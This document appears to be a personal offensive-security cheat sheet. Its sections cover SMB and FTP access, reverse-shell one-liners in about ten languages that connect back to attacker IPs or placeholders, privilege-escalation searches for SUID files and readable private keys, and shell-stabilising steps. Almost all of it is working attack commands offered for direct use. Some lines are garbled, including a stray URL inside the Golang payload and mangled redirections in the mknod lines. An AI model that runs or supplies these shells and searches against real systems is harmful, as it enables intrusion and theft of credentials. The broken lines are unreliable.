
										Connect to:

(smb public)
smbclient \\\\ipordomain\\public
(smb anon)
smbclient -L \\\\ipordomain -U 'anonymous'


(ftp anonymous)
ftp ipordomain port





										Rev Shells

	

				Bash

bash -i >& /dev/tcp/10.9.27.82/4321 0>&1




				Netcat

nc -e /bin/sh 10.0.0.1 1234

or

/bin/sh | nc ATTACKING-IP 80

or

rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p




				Perl

perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'




				Python

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.27.82",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'




				PHP

php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

or 

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>




				Ruby

ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'



				Java

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
				


				Telnet

rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p

or 

telnet attackerip 4444 | /bin/bash | telnet attackerip 4445




				Golang

echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go



				Node.js

require ('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/80 0>&1');



										
---------------------------------------------------------------------------------------
										Privesc


			SUID files


find / -uid 0 -perm -4000 -type f 2>/dev/null


			SGID Files

find / -perm -2000 -type f 2>/dev/null


			Keys or certificates tha can be read

find / -type f '(' -name *.cert -or -name *.crt -or -name *.pem -or -name *.ca -or -name *.p12 -or -name *.cer -name *.der ')' '(' '(' -user support -perm -u=r ')' -or '(' -group support -perm -g=r ')' -or '(' -perm -o=r ')' ')' 2> /dev/null-or -name *.cer -name *.der ')' 2> /dev/null
										





-----------------------------------------------------------------------------------------
										PimpShell



python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/sh")'

Ctrl+z

stty raw echo

fg + [Enter x2]

export TERM=screen
export XTERM=screen

reset






										
